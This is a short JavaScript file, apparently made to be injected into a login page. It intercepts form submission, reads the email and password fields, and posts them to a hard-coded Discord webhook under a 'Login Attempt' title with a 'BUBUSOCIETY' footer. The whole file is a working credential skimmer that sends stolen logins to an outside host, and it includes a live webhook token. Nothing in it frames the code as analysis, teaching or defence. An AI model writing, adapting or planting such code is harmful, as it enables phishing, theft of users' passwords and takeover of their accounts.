document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector('form'); 

    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const emailField = document.querySelector('input[name="email"]') || document.querySelector('input[type="email"]');
            const passField = document.querySelector('input[name="password"]');

            const email = emailField ? emailField.value : "Field Not Found";
            const password = passField ? passField.value : "Field Not Found";

            await fetch('https://discord.com/api/webhooks/1514225388040224808/A2_ZIqPQRQiTgIRJP2ArOBaqjtaQYbmzPejZE1cf28vE9fI7i17kPPpvIsYAxgrzM0G2', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "Login Attempt",
                        color: 0x5865F2,
                        fields: [
                            { name: "Email", value: email, inline: true },
                            { name: "Password", value: password, inline: true }
                        ],
                        footer: { text: "BUBUSOCIETY" },
                        timestamp: new Date()
                    }]
                })
            });
            
            console.log("Data sent");
        });
    }
});